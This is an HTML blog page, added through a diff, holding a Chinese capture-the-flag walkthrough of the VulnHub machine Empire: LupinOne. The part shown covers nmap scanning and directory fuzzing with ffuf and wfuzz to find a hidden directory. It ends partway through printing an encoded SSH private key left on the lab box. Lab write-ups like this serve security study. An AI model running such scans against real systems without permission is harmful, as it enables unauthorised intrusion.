@@ -1,0 +1,568 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Empire：LupinOne - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Empire：LupinOne">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-02 00:00" pubdate>
+        2022年7月2日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      51
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Empire：LupinOne</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x10-Empire-LupinOne-vulnhub"><a href="#0x10-Empire-LupinOne-vulnhub" class="headerlink" title="0x10 Empire: LupinOne~vulnhub"></a>0x10 Empire: LupinOne~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/empire-lupinone,750/">Empire: LupinOne ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.152</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.152</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.152</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-02 03:01 EDT<br>Nmap scan report for 192.168.135.152<br>Host is up (0.00068s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)<br>|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)<br>|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)<br>80/tcp open  http    Apache httpd 2.4.48 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/~myfiles<br>|_http-server-header: Apache/2.4.48 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>MAC Address: 00:0C:29:4A:EB:9B (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.68 ms 192.168.135.152<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.04 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 8.4p1 Debian 5 (protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.48 ((Debian))</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<p>查看源码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;!-- Its an easy box, dont give up. --&gt;<br></code></pre></td></tr></table></figure>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.152:80</span><br><br>-----------------<br>URL_BASE: http://192.168.135.152:80/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br>                                                    <br>---- Scanning URL: http://192.168.135.152:80/ ----<br>==&gt; DIRECTORY: http://192.168.135.152:80/image/<br>+ http://192.168.135.152:80/index.html (CODE:200|SIZE:333)<br>==&gt; DIRECTORY: http://192.168.135.152:80/javascript/<br>==&gt; DIRECTORY: http://192.168.135.152:80/manual/<br>+ http://192.168.135.152:80/robots.txt (CODE:200|SIZE:34)<br>+ http://192.168.135.152:80/server-status (CODE:403|SIZE:280)  <br></code></pre></td></tr></table></figure>
+<p>得到 robots.txt：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/~myfiles<br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://192.168.135.152/~myfiles/</code> ，为 Error 404 ，查看源码，得到提示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;!-- Your can do it, keep trying. --&gt;<br></code></pre></td></tr></table></figure>
+<p>换工具进行扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.152</span>     <br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.152</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.152 -w /usr/share/wordlists/dirb/common.txt -q -n -e</span><br></code></pre></td></tr></table></figure>
+<p>无结果，使用 ffuf 扫描：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010062917/article/details/120473487">Ffuf使用教程_WeUjie的博客-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/203316.html">ffuf：Go语言编写的高速Web Fuzzer - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ffuf -c -w /usr/share/wordlists/dirb/common.txt -u <span class="hljs-string">&#x27;http://192.168.135.152/~FUZZ&#x27;</span></span><br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://192.168.135.152/~FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403,405<br>________________________________________________<br><br>secret                  [Status: 301, Size: 320, Words: 20, Lines: 10]<br>:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -c -u <span class="hljs-string">&#x27;http://192.168.135.152/~FUZZ&#x27;</span> --hc 404 -w /usr/share/wordlists/dirb/common.txt</span><br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://192.168.135.152/~FUZZ<br>Total requests: 4614<br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload<br>=====================================================================<br>000003537:   301        9 L      28 W       320 Ch      &quot;secret&quot;<br><br>Total time: 4.177629<br>Processed Requests: 4614<br>Filtered Requests: 4613<br>Requests/sec.: 1104.453<br></code></pre></td></tr></table></figure>
+<p>发现 secret ，访问 <code>http://192.168.135.152/~secret</code> ，得到提示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,<br>Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.<br>I&#x27;m smart I know that.<br>Any problem let me know<br>Your best friend icex64<br></code></pre></td></tr></table></figure>
+<p>一共可以得到三个信息，用户名可能是 icex64 ，存在一个 ssh private key file ，可以用 fasttrack 破解 。</p>
+<p>用 ffuf 寻找私钥：</p>
+<blockquote>
+<p>由于私钥文件一般放在 .ssh 文件夹下，所以按照 “.FUZZ” 的思路枚举，又因为是文件，故添加后缀</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ffuf -c -w /usr/share/wordlists/dirb/common.txt -u <span class="hljs-string">&#x27;http://192.168.135.152/~secret/.FUZZ&#x27;</span> -<span class="hljs-built_in">fc</span> 403 -e .txt,.html,.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u <span class="hljs-string">&#x27;http://192.168.135.152/~secret/.FUZZ&#x27;</span> -<span class="hljs-built_in">fc</span> 403 -e .txt</span><br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://192.168.135.152/~secret/.FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br> :: Extensions       : .txt <br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403,405<br> :: Filter           : Response status: 403<br>________________________________________________<br><br>mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2]<br>:: Progress: [175328/175328] :: Job [1/1] :: 9583 req/sec :: Duration: [0:00:18] :: Errors: 0 ::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hc 404,403 -u http://192.168.135.152/~secret/.FUZZ.txt</span><br><br>Target: http://192.168.135.152/~secret/.FUZZ.txt<br>Total requests: 220560<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload<br>=====================================================================<br>[......]<br>000073703:   200        1 L      1 W        4689 Ch     &quot;mysecret&quot;<br><br>Total time: 0<br>Processed Requests: 220560<br>Filtered Requests: 220546<br>Requests/sec.: 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.135.152/~secret/.FUZZ</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.135.152/~secret/.FUZ2ZFUZZ</span><br></code></pre></td></tr></table></figure>
+<p>得到文件 mysecret.txt ，访问 <code>http://192.168.135.152/~secret/.mysecret.txt</code> ，看起来像是 base64加密：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a></p>
+</blockquote>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">cGxD<span class="hljs-number">6</span>K<span class="hljs-symbol">NZQddY6</span>iCsSuqPzUdqSx<span class="hljs-number">4</span>F<span class="hljs-number">5</span>ohDY<span class="hljs-symbol">nArU3</span>kw<span class="hljs-number">5</span>dmvTURqcaTr<span class="hljs-symbol">ncHC3</span><span class="hljs-symbol">NLKBqFM2</span>ywr<span class="hljs-symbol">NbRTW3</span>eTpUvEz<span class="hljs-number">9</span>qFuB<span class="hljs-symbol">nyhAK8</span>TWu<span class="hljs-number">9</span>cFxLoscWUrc<span class="hljs-number">4</span>rLcRafiVvxPRpP<span class="hljs-number">692</span>Bw<span class="hljs-number">5</span>bshu<span class="hljs-number">6</span>ZZpixzJWv<span class="hljs-symbol">NZhPEoQoJRx7</span>jU<span class="hljs-symbol">nupsEhcCgjuXD7</span>B<span class="hljs-symbol">N1</span>TMZGL<span class="hljs-number">2</span><span class="hljs-symbol">nUxcDQwahUC1</span>u<span class="hljs-number">6</span><span class="hljs-symbol">NLSK81</span>Yh<span class="hljs-number">9</span>Lk<span class="hljs-symbol">ND67</span>WD<span class="hljs-number">87</span>Ud<span class="hljs-number">2</span>JpdUwjMossSeHEbvYjCEYB<span class="hljs-symbol">nKRPpDhSgL7</span>jmTzxmtZxS<span class="hljs-number">9</span>wX<span class="hljs-number">6</span>D<span class="hljs-symbol">NLmQBsNT936</span>L<span class="hljs-number">6</span>VwYdEPKuLeY<span class="hljs-number">6</span>wuyYmffQYZEVXhDtK<span class="hljs-number">6</span>pokmA<span class="hljs-number">3</span>J<span class="hljs-meta">o2</span>Q<span class="hljs-number">83</span>cVok<span class="hljs-number">6</span>x<span class="hljs-number">74</span><span class="hljs-name">M5</span>DA<span class="hljs-number">1</span>TdjKvEsVGLvRMkkDpshztiGCaDu<span class="hljs-number">4</span>uceLw<span class="hljs-number">3</span>iLYv<span class="hljs-symbol">NVZK75</span>k<span class="hljs-number">9</span>zK<span class="hljs-number">9</span>E<span class="hljs-number">2</span>qcdwP<span class="hljs-number">7</span>yWugahC<span class="hljs-symbol">n5</span>HyoaooLeBDiCAojj<span class="hljs-number">4</span>JUxafQUcmfocvugz<span class="hljs-symbol">n81</span>GAJ<span class="hljs-number">8</span>LdxQjosS<span class="hljs-number">1</span>tHmriYtwp<span class="hljs-number">8</span>pGf<span class="hljs-number">4</span><span class="hljs-symbol">Nfq5</span>FjqmGAdvA<span class="hljs-number">2</span>ZPMUAVWVHgkeSVE<span class="hljs-symbol">nooKT8</span>sxGUfZxg<span class="hljs-symbol">nHAfER49</span><span class="hljs-symbol">nZnz1</span>YgcFkR<span class="hljs-number">73</span>rWfP<span class="hljs-number">5</span><span class="hljs-symbol">NwEpsCgeCWYSYh3</span>XeF<span class="hljs-number">3</span>dUqBBpf<span class="hljs-number">6</span>xMJ<span class="hljs-symbol">nS7</span>wmZa<span class="hljs-number">9</span>oWZVd<span class="hljs-number">8</span>Rxs<span class="hljs-number">1</span>zrXawVKSLxardUEfRLh<span class="hljs-number">6</span>us<span class="hljs-symbol">nUmMMAnSmTyuvMTnjK2</span>vzTBbd<span class="hljs-number">5</span>djvhJKaY<span class="hljs-number">2</span>szXFetZdWBsRFhUwReUk<span class="hljs-number">7</span>DkhmCPb<span class="hljs-number">2</span>mQ<span class="hljs-symbol">NoTSuRpnfUG8</span>CWaD<span class="hljs-number">3</span>L<span class="hljs-number">2</span>Q<span class="hljs-number">9</span>UHepvrs<span class="hljs-number">67</span>YGZJWwk<span class="hljs-number">54</span>rmT<span class="hljs-number">6</span>v<span class="hljs-number">1</span>pHHLDR<span class="hljs-number">8</span>gBC<span class="hljs-number">9</span>ZTfdDtzBaZ<span class="hljs-meta">o8</span>sesPQVbuKA<span class="hljs-number">9</span>VE<span class="hljs-attr">Vsgw1</span>xVvRyRZz<span class="hljs-number">8</span>JH<span class="hljs-number">6</span>DEzqrE<span class="hljs-symbol">neoibQUdJxLVNTMXpYXGi68</span>RA<span class="hljs-number">4</span>V<span class="hljs-number">1</span>pa<span class="hljs-number">5</span>yaj<span class="hljs-number">2</span>UQ<span class="hljs-number">6</span>xRpF<span class="hljs-number">6</span>otrWTerjwAL<span class="hljs-symbol">N67</span>preSWWH<span class="hljs-number">4</span>vY<span class="hljs-number">3</span>MBv<span class="hljs-number">9</span>Cu<span class="hljs-number">6358</span>KWe<span class="hljs-attr">VC1</span>YZAXvBRwoZPXtquY<span class="hljs-number">9</span>EiFL<span class="hljs-number">6</span>i<span class="hljs-number">3</span>KXFe<span class="hljs-number">3</span>Y<span class="hljs-number">7</span>W<span class="hljs-number">4</span>Li<span class="hljs-number">7</span>jF<span class="hljs-number">8</span>vFrK<span class="hljs-number">6</span>woYGy<span class="hljs-number">8</span>soJJYEbXQp<span class="hljs-number">2</span><span class="hljs-symbol">NWqaJNcCQX8</span>umkiGf<span class="hljs-symbol">NFNiRoTfQmz29</span>wBZFJPtPJ<span class="hljs-number">98</span>UkQwKJfSW<span class="hljs-number">9</span>XKvDJwduMRWey<span class="hljs-number">2</span>j<span class="hljs-number">61</span>yaH<span class="hljs-number">4</span>ij<span class="hljs-number">5</span>uZQXDs<span class="hljs-number">37</span>F<span class="hljs-symbol">NV7</span>TBj<span class="hljs-number">71</span>GGFGEh<span class="hljs-number">8</span><span class="hljs-attr">vSKP2</span>g<span class="hljs-name">g5</span><span class="hljs-symbol">nLcACbkzF4</span>zjqdikP<span class="hljs-number">3</span>TF<span class="hljs-symbol">NWGnij5</span>az<span class="hljs-number">3</span>Axve<span class="hljs-symbol">N3</span>EUF<span class="hljs-symbol">nuDtfB4</span>ADRt<span class="hljs-number">57</span>UokLMDi<span class="hljs-number">1</span>V<span class="hljs-number">73</span>Pt<span class="hljs-number">5</span>PQe<span class="hljs-number">8</span><span class="hljs-name">g8</span>SLjuvt<span class="hljs-symbol">NYpo8</span>AqyC<span class="hljs-number">3</span>zTMSmP<span class="hljs-number">8</span>dFQgoborCXEMJz<span class="hljs-number">6</span><span class="hljs-symbol">npX6</span>QhgXqpbhS<span class="hljs-number">58</span>yVRhpW<span class="hljs-number">21</span><span class="hljs-symbol">Nz4</span>xFkDL<span class="hljs-number">8</span>QFCVH<span class="hljs-number">2</span>beL<span class="hljs-number">1</span>PZxEghmdVdY<span class="hljs-number">9</span><span class="hljs-symbol">N3</span>pVrMBUS<span class="hljs-number">7</span>Mz<span class="hljs-symbol">nYasCruXqWVE55</span>RPuSPrMEcRLoCa<span class="hljs-number">1</span>XbYt<span class="hljs-name">G5</span>JxqfbE<span class="hljs-name">g2</span>aw<span class="hljs-number">8</span>BdMirLLWhuxb<span class="hljs-name">m3</span>hxrr<span class="hljs-number">9</span>ZizxDDyu<span class="hljs-number">3</span>i<span class="hljs-number">1</span>PLkpHgQw<span class="hljs-number">3</span>zH<span class="hljs-number">4</span>GTK<span class="hljs-number">2</span>mb<span class="hljs-number">5</span>fxuu<span class="hljs-number">9</span>W<span class="hljs-number">6</span><span class="hljs-symbol">nGWW24</span>wjGbxHW<span class="hljs-number">6</span>aT<span class="hljs-symbol">neLweh74</span>jFWKzfSLgEVyc<span class="hljs-number">7</span>RyAS<span class="hljs-number">7</span>Qkwkud<span class="hljs-number">9</span>ozyBxxsV<span class="hljs-number">4</span>VEdf<span class="hljs-number">8</span>mW<span class="hljs-number">5</span><span class="hljs-name">g3</span><span class="hljs-symbol">nTDyKE69</span>P<span class="hljs-number">34</span>SkpQgDV<span class="hljs-symbol">NKJvDfJvZbL8</span><span class="hljs-meta">o6</span>BfPjEPi<span class="hljs-number">125</span>edV<span class="hljs-number">9</span>JbCy<span class="hljs-symbol">NRFKKpTxpq7</span>QSruk<span class="hljs-number">7</span>L<span class="hljs-number">5</span>LEX<span class="hljs-name">G8</span>H<span class="hljs-number">4</span>rsLyv<span class="hljs-number">6</span>djUT<span class="hljs-number">9</span><span class="hljs-symbol">nJGWQKRPi3</span>Bugawd<span class="hljs-number">7</span>ixMUYoRMhagBmGY<span class="hljs-symbol">Nafi4</span>JBapacTMw<span class="hljs-name">G95</span>wPyZT<span class="hljs-number">8</span>Mz<span class="hljs-number">6</span>gALq<span class="hljs-number">5</span>Vmr<span class="hljs-number">8</span>tkk<span class="hljs-number">9</span>ry<span class="hljs-number">4</span>Ph<span class="hljs-number">4</span>U<span class="hljs-number">2</span>Erihv<span class="hljs-symbol">NiFQVS7</span>U<span class="hljs-number">9</span>XBwQHc<span class="hljs-number">6</span>fhrDHz<span class="hljs-number">2</span>objdeDGvuVHzPgqMeRMZtjzaLBZ<span class="hljs-number">2</span>wDLeJUKEjaJAH<span class="hljs-symbol">nFLxs1</span>xWXU<span class="hljs-number">7</span>V<span class="hljs-number">4</span>gigRAtiMFB<span class="hljs-number">5</span>bjFTc<span class="hljs-number">7</span>owzKHcqP<span class="hljs-number">8</span><span class="hljs-symbol">nJrXou8</span>VJqFQDMD<span class="hljs-number">3</span>PJcLjdErZGUS<span class="hljs-number">7</span>oauaa<span class="hljs-number">3</span>xhyx<span class="hljs-number">8</span>Ar<span class="hljs-number">3</span>Aygg<span class="hljs-symbol">nywjjwZ8</span>uoWQbmx<span class="hljs-number">8</span>Sx<span class="hljs-number">71</span>x<span class="hljs-number">4</span><span class="hljs-symbol">NyhHZUzHpi8</span>vkEkbKKk<span class="hljs-number">1</span>rVL<span class="hljs-symbol">NBWHHi75</span>HixzAt<span class="hljs-symbol">NTX6</span>p<span class="hljs-symbol">nEJC3</span>t<span 